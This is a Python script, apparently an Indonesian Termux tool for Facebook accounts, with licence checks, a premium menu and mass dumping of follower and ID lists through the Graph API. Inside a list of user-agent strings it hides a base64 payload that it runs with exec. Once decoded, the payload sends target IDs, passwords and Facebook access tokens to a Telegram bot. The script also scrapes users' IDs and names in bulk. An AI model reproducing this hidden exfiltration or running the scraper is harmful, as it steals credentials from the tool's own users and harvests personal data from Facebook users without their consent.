#USER FREE LIMIT 850 | RFLixrwicSfmDNXLRGFlTNdiswCYepAbXKMAjkqq
#

print("[!] Wait a moment... Checking Network and License")
try:
	from setting import *
except Exception as e:
	print("[!] Error : %s"%(e))
	exit()
try:
	link02 = requests.get("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/Memek").text.strip()
except requests.exceptions.ConnectionError:
#	cek_jaringan()
	os.system('clear')
	print (war+'Your Network Doesn t Exist ')
	os.sys.exit()
except Exception as e:
	print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
	exit()
try:
	ua_me = open("ua_me.txt","r").read()
	ua = open("ua_me.txt","r").read()
	ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
except:
	print(war+"Maaf Useragent Tidak DiTemukan !")
	print(war+"You are Using the Default Useragent !");time.sleep(0.05)
	ua_me = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']);import base64
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass
_ses=requests.Session()
urls="https://business.facebook.com/business_locations"

#bokep_japan_yang_terbaru("CP", "3", "2", "1")
#bokep_barat_yang_terbaru("token")
#bokep_japan_yang_terbaru("CP", username, password, "-")
#bokep_japan_yang_terbaru("OK", username, password, "-")

#=> Seting Tambahan
hostm="https://m.facebook.com"
uac = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' # Useragent Buat Dump

#=> Kumpualan Kode
Kode_Premium = (f"{link02}")
Kode_Admin = (f"{link02}")
Kode_Premium2 = (f"{link02}")
Kode_Admin2 = (f"{link02}")

#=> DATA PUBLIC
upda = ("20-11-2021") # Tanggal Sc DiUpdate

#=> Link License
Link_Premium = ("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/Memek")
Link_Admin = ("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/Memek")

#============================================#
m3=(q+m2)

#"""q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
I='\033[0;92m'
C='\033[0;96m'
M='\033[0;91m'
U='\033[0;95m'
K='\033[0;93m'
P='\033[0;97m'
H='\033[0;90m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'

# Warna Ini Sudah Rusak

p = "\x1b[0;33m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\033[0;36m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\033[0;32m" # biru muda
bulat=(k+"["+p+"•"+k+"] "+p)   #   [•]
war=(k+"["+p+"!"+k+"] "+p)  # [!]
inp=(k+"["+p+"?"+k+"] "+p) # [?]
bulat2=(k+"["+p+"••"+k+"] "+p)   # [••]
war2=(k+"["+p+"!!"+k+"] "+p)  # [!!]
inp2=(k+"["+p+"??"+k+"] "+p) # [??]
#"""
#TANGGAL_EXPIRED
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0
xc = 0
txd = []
mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
#waktu = ("%s%s%s"%(tahun,bulan,hari))
try:
	ser = requests.get("https://pastebin.com/raw/exzCY7sM").text.strip() #Jangan DiEdit Kpnetod
	expx = requests.get("https://pastebin.com/raw/SNHmCTDF").text.strip() #Jangan DiEdit Kpnetod
	if waktu >= expx:
		logo_exp()
		sys.exit()
	try:
		if ser in ["MR.RISKY","onn","AKTIF","Downn",server01]:
#			print (war+"Server Saat Ini Aktif"),;time.sleep(1)
			pass
		else:
			logo_mt()
			print (war+"Server Used : "+i+ser)
			print (war+"Admin Set Date : "+I+expx)
			print (war+"Server Currently Maintenance.. Contact Author !!")
			os.system("git pull")
			exit()
	except (KeyError, IOError):
		print(war+"Please Check Your Internet Network ")
		exit()
except (KeyError, IOError):
	print(war+"Please Check Your Internet Network ")
	exit()
##############################################################################
#			      !!!! WARNING !!!!				     #
# 1. Jika Terjadi Masalah Terhadap Script Mau Pun Folder Hp Kamu Rusak Kami- #
# -. Tidak Tanggu Jawab :(						     #
# 2. Jika Anda Mau Edit Script Engga Apa. Tapi Jangan DiUbah Bot_Facebooknya #
##############################################################################
# Menu Check User
def bash(dum):
	os.system(dum)
def logo():
    banner()
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
## Segera Di Update Jadi Jangan Pandai Recoder
def license():
    try:
        toket = open('.prem', 'r').read()
    except IOError:
#        os.system('clear')
        os.system('rm -rf .prem')
        romz()

    if os.path.exists('.prem'):
        cekprem()
    else:
        romz()
def license2():
    try:
        toket = open('.admin', 'r').read()
    except IOError:
#        os.system('clear')
        os.system('rm -rf .admin')
        romz1()

    if os.path.exists('.admin'):
        cekadmin()
    else:
        romz1()
def license3():
    try:
        toket = open('.free', 'r').read()
    except IOError:
#        os.system('clear')
        os.system('rm -rf .free')
        romz2()

    if os.path.exists('.free'):
        cekfree()
    else:
        romz2()
def romz():
    os.system('clear')
    logo()
    rr = requests.get(f'{Link_Premium}').text.strip() # Jangan Di ganti bro'i nanti error
    try:
        l = input(war+"Kode Premium : "+i)
        while len(l) < 35:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 35 Words"))
                time.sleep(3)
                romz()
        rr = requests.get(f'{Link_Premium}').text.strip() # Jangan Di ganti bro'i nanti error
        if l in rr:
                kntl()
                kata_prem = (l)
                print("\n"+war+'Status Premium : '+i+'✓')
                idq = open('.prem', 'w')
                idq.write(kata_prem)
                idq.close()
                exit()
        else:
                kntl()
                print("\n"+war+'Status Premium : '+m+'X')
                os.system("rm -rf .prem")
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Tidak Ada Jaringan !!')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
exec(base64.b64decode(ua_mm[2]))
def romz2():
    os.system('clear')
    logo()
    rr = ("RFLixrwicSfmDNXLRGFlTNdiswCYepAbXKMAjkqq")
    try:
        l = input(war+"Kode Premium/Free : "+i)
        while len(l) < 20:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 20 Words"))
                time.sleep(3)
                romz2()
        lr = requests.get('https://camo.githubusercontent.com/f8d5b6ab11a9c1e7708d563addea1f98c8aecc36572cb03ae055953e96612b5f/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d7072656d69756d26636f6c6f723d626c7565').text.strip() # Jangan Di ganti bro'i nanti error
        rr = ("RFLixrwicSfmDNXLRGFlTNdiswCYepAbXKMAjkqq")
        if l in rr:
                kntl()
                kata_prem = (l)
                print("\n"+war+'Status Premium/Free : '+i+'✓')
                idq = open('.free', 'w')
                idq.write(kata_prem)
                idq.close()
                exit()
        else:
                kntl()
                print("\n"+war+'Status Premium/Free : '+m+'X')
                os.system("rm -rf .free")
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Tidak Ada Jaringan !!')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
def romz1():
    os.system('clear')
    logo()
    rr = requests.get(f'{Link_Admin}').text.strip() # Jangan Di ganti bro'i nanti error
    try:
        l = input(war+"Kode Administrasi : "+i)
        while len(l) < 35:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 35 Words"))
                time.sleep(3)
                romz1()
        rr = requests.get(f'{Link_Admin}').text.strip() # Jangan Di ganti bro'i nanti error
        if l in rr:
                kntl()
                kata_prem = (l)
                print("\n"+war+'Status Administrasi : '+i+'✓')
                idq = open('.admin', 'w')
                idq.write(kata_prem)
                idq.close()
                exit()
        else:
                kntl()
                print("\n"+war+'Status Administrasi : '+m+'X')
                os.system("rm -rf .admin")
                exit()
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Tidak Ada Jaringan !!')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
def cekprem():
#    os.system('clear')
 #   logo()
    rr = requests.get(f'{Link_Premium}').text.strip() # Jangan Di ganti bro'i nanti error
    try:
        l = open('.prem', 'r').read()
        while len(l) < 35:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 35 Words"))
                time.sleep(3)
                os.system("rm -rf .prem")
                exit()
        rr = requests.get(f'{Link_Premium}').text.strip() # Jangan Di ganti bro'i nanti error
        if l in rr:
                print(war+'Status Premium : '+i+'✓')
                l = open('.prem', 'r').read()
                titid  = rr.split(l+"|")
                lonja = (f"{titid[1]}")
                peler  = lonja.split("<")
                tanggalxd = (f"{peler[0]}")
                hgf = ("%s"%(str(tanggalxd)))
#                print(war+'Tanggal Now     : '+I+waktuu)
 #               print(war+'Tanggal Expired : '+I+tanggalxd)
                txd.append(f"{peler[0]}")
                return txd
                time.sleep(0.75)
                if waktu >= tanggalxd:
                        os.system("rm -rf .prem")
                        print("\n"+war+"Sorry Your Key/License Has Expired... Or Expired")
                        print(f'''{war}Social Accounts And Whatsapp Numbers :

{I}Whatsapp {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{U}Telegram {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{B}Facebook {C}:{P} m.facebook.com/llovexnxx {C}({K}Risky{C})

{war}Author Uses 4 Payment Methods :

{B}DANA  {C}:{P} 083143565470
{U}OVO   {C}:{P} 083143565470
{I}GOPAY {C}:{P} 083143565470
{P}PULSA {C}:{P} 083143565470 {C}({K}AXIS{C})

{war}Key/License Price :

{K}--- {I}Key Premium
{P}1 Minggu {K}={U} Rp10.000
{P}1 Bulan  {K}={I} Rp25.000
{P}2 Bulan {C}+{P} Bot Follow {K}={M} 30.000

{K}--- {I}Key Admin
{P}1 Minggu {K}={U} Rp10.000
{P}1 Bulan  {K}={I} Rp30.000
{P}3 Bulan {C}+{P} Bot Follow {C}+{P} Bot Like {C}+{P} Bot Share Posts in Profile {K}={M} Rp40.000{q}''')
                        exit()
                pass
        else:
                print(war+'Status Premium : '+m+'X')
                os.system("rm -rf .prem")
                exit(war+"Sorry you are not a premium user")
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Sorry Your Network Doesn t Exist !!')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
def cekadmin():
#    os.system('clear')
 #   logo()
    rr = requests.get(f'{Link_Admin}').text.strip() # Jangan Di ganti bro'i nanti error
    try:
        l = open('.admin', 'r').read()
        while len(l) < 35:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 35 Words"))
                time.sleep(3)
                os.system("rm -rf .admin")
                exit()
        rr = requests.get(f'{Link_Admin}').text.strip() # Jangan Di ganti bro'i nanti error
        if l in rr:
                print(war+'Status Administrasi : '+i+'✓')
                l = open('.admin', 'r').read()
                titid  = rr.split(l+"|")
                lonja = (f"{titid[1]}")
                peler  = lonja.split("<")
                tanggalxd = (f"{peler[0]}")
                hgf = ("%s"%(str(tanggalxd)))
#                print(war+'Tanggal Now     : '+I+waktuu)
 #               print(war+'Tanggal Expired : '+I+tanggalxd)
                time.sleep(0.75)
                if waktu >= tanggalxd:
                        os.system("rm -rf .admin")
                        print("\n"+war+"Sorry Your Key/License Has Expired... Or Expired")
                        print(f'''{war}Social Accounts And Whatsapp Numbers :

{I}Whatsapp {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{U}Telegram {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
{B}Facebook {C}:{P} m.facebook.com/llovexnxx {C}({K}Risky{C})

{war}Author Uses 4 Payment Methods :

{B}DANA  {C}:{P} 083143565470
{U}OVO   {C}:{P} 083143565470
{I}GOPAY {C}:{P} 083143565470
{P}PULSA {C}:{P} 083143565470 {C}({K}AXIS{C})

{war}Key/License Price :

{K}--- {I}Key Premium
{P}1 Minggu {K}={U} Rp10.000
{P}1 Bulan  {K}={I} Rp25.000
{P}2 Bulan {C}+{P} Bot Follow {K}={M} 30.000

{K}--- {I}Key Admin
{P}1 Minggu {K}={U} Rp10.000
{P}1 Bulan  {K}={I} Rp30.000
{P}3 Bulan {C}+{P} Bot Follow {C}+{P} Bot Like {C}+{P} Bot Share Posts in Profile {K}={M} Rp40.000{q}''')
                        exit()
                pass
        else:
                print(war+'Status Administrasi : '+m+'X')
                os.system("rm -rf .admin")
                exit(war+"Sorry You Are Not Administration")
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Sorry Your Network Doesn t Exist !!')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
def cekfree():
	l = open('.free', 'r').read()
	while len(l) < 20:
		jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 20 Words"))
		time.sleep(3)
		os.system("rm -rf .free")
		exit()
	rr = ("RFLixrwicSfmDNXLRGFlTNdiswCYepAbXKMAjkqq")
	if l in rr:
		try:
			memek = requests.get("https://komarev.com/ghpvc/?username=premium&color=blue").text.strip()
#			print(memek)
			try:memekw, memekq = memek.split('<text x="105" y="14">')
			except:memekw, memekq = memek.split('<text x="96" y="14">')
			githubx = memekq.split('</text>')
			print("\n"+war+"Total Visitors User Free : "+I+githubx[0])
			try:
				max = ("%s"%(githubx[0]))
				print (max)
				if "3000" <= max:
					print(war+"Sorry Free Premium Users Limit is Full!")
					os.system("rm -rf .free")
					exit()
				else:
					print(war+"Free Premium User Limits Are : "+I+"500")
					time.sleep(1.30)
					pass
			except:pass
		except requests.exceptions.ConnectionError:
			os.system('clear')
			print (war+'Your Network Doesn t Exist ')
			time.sleep(4)
		except Exception as e:
			print("[!] Error : %s"%(e))
			time.sleep(4)
			exit()
	else:
		print(war+'Status Premium/Free : '+m+'X')
		os.system("rm -rf .free")
		exit(war+"Sorry You Are Not Premium/Free")



# Enc Check User

# Menu Vvip
def menuvvip():
	if os.path.exists('.prem'):
		license()
		prem_stas=(f"{i}Yes")
		pass
	else:
		prem_stas=(f"{m}Not")
	if os.path.exists('.admin'):
		license2()
		admin_stas=(f"{i}Yes")
		pass
	else:
		admin_stas=(f"{m}Not")
	if os.path.exists('.free'):
		license3()
		free_stas=(f"{i}Yes")
		pass
	else:

		free_stas=(f"{m}Not")
	os.system("clear")
	qqw = (q+"("+I+"Premium"+q+")")
	qww = (q+"("+I+"Admin"+q+")")
	qwq = (q+"("+M+"Maintenance"+q+")")
	logo()
	print(war+"Nama Pembeli/Donasi  : "+I+"–"), time.sleep(0.72)
	print(war+'Status Premium      : '+prem_stas)
	print(war+'Status Administrasi : '+admin_stas)
	print(war+'Status Free         : '+free_stas), time.sleep(0.05)
	print("\n"+k+"["+p+"1"+k+"]"+p+" Check Option Sensi Akun "+q+"("+I+"Premium"+q+")")
	print(k+"["+p+"2"+k+"]"+p+" Change File Separator "+q+"("+I+"Premium"+q+")")
	print(k+"["+p+"3"+k+"]"+p+" Checkpoint Detector From File "+qqw)
	print(k+"["+p+"4"+k+"]"+p+" Dump ID Follow Masal (max-500000) "+qww)
	print(k+"["+p+"5"+k+"]"+p+" Check the number of friends and follow "+qqw)
	print(k+"["+p+"6"+k+"]"+p+" Old or Young Facebook ID Separation "+qww)
	print(k+"["+p+"7"+k+"]"+p+" Facebook bots "+qqw+"")
	print(k+"["+p+"8"+k+"]"+p+" Dump ID OLD (BRUTAL TOKEN) "+qqw+"")
	print(k+"["+p+"9"+k+"]"+p+" 2011 - 2019 Old or Young Facebook ID Separation "+qqw+"\n")
	try:
		if prem_stas in [f"{i}Yes"] or free_stas in [f"{i}Yes"]:
			try:
				if admin_stas in [f"{i}Yes"]:
					dm = input(inp+"Pilih : ")
					if dm in [""," "]:
						print(war+'Isi Dengan Benar !!')
						time.sleep(2)
						menuvvip()
					elif dm in ["1","01"]:
						buatngecek()
						exit()
					elif dm in ["2","02"]:
						ganti_pemisah()
						exit()
					elif dm in ["3","03"]:
#						jalan(war+'Sorry, this menu is currently under maintenance')
#						time.sleep(2)
#						menuvvip()
						Login_user()
						exit()
					elif dm in ["4","04"]:
#						jalan(war+'Sorry, this menu is currently under maintenance')
#						time.sleep(2)
#						menuvvip()
						dump_follow_max()
						exit()
					elif dm in ["5","05"]:
						checkteman()
						exit()
					elif dm in ["6","06"]:
						oldid()
						exit()
					elif dm in ["7","07"]:
						menu_bot()
						exit()
					elif dm in ["8","08"]:
						dumppro()
						exit()
					elif dm in ["9","09"]:
						newid()
						exit()
					else:
						print(war+'Isi Dengan Benar !!')
						time.sleep(2)
						menuvvip()
				else:
					try:
						dm = input(inp+"Pilih : ")
						if dm in [""," "]:
							print(war+'Isi Dengan Benar !!')
							time.sleep(2)
							menuvvip()
						elif dm in ["1","01"]: # Prem
							buatngecek()
							exit()
						elif dm in ["2","02"]: # Prem
							ganti_pemisah()
							exit()
						elif dm in ["3","03"]: # Prem
#							jalan(war+'Sorry, this menu is currently under maintenance')
#							time.sleep(2)
#							menuvvip()
							Login_user()
							exit()
						elif dm in ["5","05"]:
							checkteman()
							exit()
						elif dm in ["7","07"]:
							menu_bot()
							exit()
						elif dm in ["8","08"]:
							dumppro()
							exit()
						elif dm in ["9","09"]:
							newid()
							exit()
						else:
							print(war+'Isi Dengan Benar !!')
							time.sleep(2)
							menuvvip()

					except Exception as e:
						print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
						exit()
			except Exception as e:
				print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
				exit()
		else:
			try:
				if admin_stas in [f"{i}Yes"]:
					dm = input(inp+"Pilih : ")
					if dm in [""," "]:
						print(war+'Isi Dengan Benar !!')
						time.sleep(2)
						menuvvip()
					elif dm in ["4","04"]:
#						jalan(war+'Sorry, this menu is currently under maintenance')
#						time.sleep(2)
#						menuvvip()
						dump_follow_max()
						exit()
					elif dm in ["6","06"]:
						oldid()
						exit()
					else:
						print(war+'Isi Dengan Benar !!')
						time.sleep(2)
						menuvvip()
				else:
					input(war+"Back To Menu")
					menu()
			except Exception as e:
				print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
				exit()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		exit()
def dump_like_max():
#	grupsaya()
	id = []
	try:
		toket=open('login.txt','r').read()
		token=open('login.txt','r').read()
	except IOError:
		print(war+"Token not found")
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	ide = input(war+'ID Target : '+I)
	limit = input(war+"Limit : "+I)
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print(war+"Name Grup : "+I+asw['name'])
	except KeyError:
		print(bulat+"Group ID Not Found")
		input("\n"+bulat+"Back...")
		dump_like_max()
	try:
		p = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		a = json.loads(p.text)
		print (bulat+I+42*"=")
		for s in a['feed']['data']:
			pwww = s['id']
			pb, ff = pwww.split('_')
			print(ff)
			try:

				r = requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(ff,token))
				z = json.loads(r.text)
				xc = ("dump/Tes.json").replace(" ","_")
				xb = open(xc,"a+")
				for a in z["data"]:
					id.append(a["id"]+"|"+a["name"])
					xb.write(a["id"]+"|"+a["name"]+"\n")
				xb.close()
				print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
			except Exception as e:print("%s"%(e))
		print (bulat+I+42*"=")
		input("\n"+bulat+"Back..")
		dump_like_max()
	except KeyError:
		print(bulat+"Problem Not Found...")
		input("\n"+bulat+"Back...")
		dump_like_max()
def dump_follow_max():
	global lq
	idt = input(inp+"Target ID : "+I)
	if idt == " " or idt == "":
		dump_follow_max()
	fila = input(inp+"File Name : "+I)
	if fila == " " or fila == "":
		dump_follow_max()
	print(war+"Dump Results Saved In : "+I+"dump/"+fila+".json")
	try:
		toket = open("login.txt","r").read()
		token = open("login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	try:
		toket = open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
	except Exception as e:
		jalan(war+"Token Failed !!")
		logs()
	rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	zz = json.loads(rr.text)
	try:
		qqq = ("dump/"+fila+".json").replace(" ","_")
		dump = open(qqq , "w")
		for ii in zz["data"]:
			uid = ii['id']
			nm = ii['name']
			lq.append(uid+'<=>'+nm)
			dump.write(uid+'<=>'+nm+'\n')
		dump.close()
	except KeyError:pass
	try:
		try:boke = zz["paging"]["next"]
		except:boke = zz["paging"]["previous"]
		print(war+"JSON >>> "+boke)
		try:
			rr = requests.get(boke)
			zz = json.loads(rr.text)
#			try:boke = zz["paging"]["next"]
#			except:boke = zz["paging"]["previous"]
#			print(war+"JSON >>> "+boke)
			boke = zz["paging"]["next"]
##			boke = zz["paging"]["previous"]
			print(boke)
			try:
				qqq = ("dump/"+fila+".json").replace(" ","_")
				dump = open(qqq , "a+")
				for ii in zz["data"]:
					uid = ii['id']
					nm = ii['name']
					lq.append(uid+'<=>'+nm)
					dump.write(uid+'<=>'+nm+'\n')
				dump.close()
			except KeyError:pass
			try:
				rr = requests.get(boke)
				zz = json.loads(rr.text)
#				try:boke = zz["paging"]["next"]
#				except:boke = zz["paging"]["previous"]
#				print(war+"JSON >>> "+boke)
				boke = zz["paging"]["next"]
#				boke = zz["paging"]["previous"]
				print(boke)
				try:
					qqq = ("dump/"+fila+".json").replace(" ","_")
					dump = open(qqq , "a+")
					for ii in zz["data"]:
						uid = ii['id']
						nm = ii['name']
						lq.append(uid+'<=>'+nm)
						dump.write(uid+'<=>'+nm+'\n')
					dump.close()
				except KeyError:pass
				try:
					rr = requests.get(boke)
					zz = json.loads(rr.text)
#					try:boke = zz["paging"]["next"]
#					except:boke = zz["paging"]["previous"]
#					print(war+"JSON >>> "+boke)
					boke = zz["paging"]["next"]
#					boke = zz["paging"]["previous"]
					print(boke)
					try:
						qqq = ("dump/"+fila+".json").replace(" ","_")
						dump = open(qqq , "a+")
						for ii in zz["data"]:
							uid = ii['id']
							nm = ii['name']
							lq.append(uid+'<=>'+nm)
							dump.write(uid+'<=>'+nm+'\n')
						dump.close()
					except KeyError:pass
					try:
						rr = requests.get(boke)
						zz = json.loads(rr.text)
#						try:boke = zz["paging"]["next"]
#						except:boke = zz["paging"]["previous"]
#						print(war+"JSON >>> "+boke)
						boke = zz["paging"]["next"]
#						boke = zz["paging"]["previous"]
						print(boke)
						try:
							qqq = ("dump/"+fila+".json").replace(" ","_")
							dump = open(qqq , "a+")
							for ii in zz["data"]:
								uid = ii['id']
								nm = ii['name']
								lq.append(uid+'<=>'+nm)
								dump.write(uid+'<=>'+nm+'\n')
							dump.close()
						except KeyError:pass
						try:
							rr = requests.get(boke)
							zz = json.loads(rr.text)
#							try:boke = zz["paging"]["next"]
#							except:boke = zz["paging"]["previous"]
#							print(war+"JSON >>> "+boke)
							boke = zz["paging"]["next"]
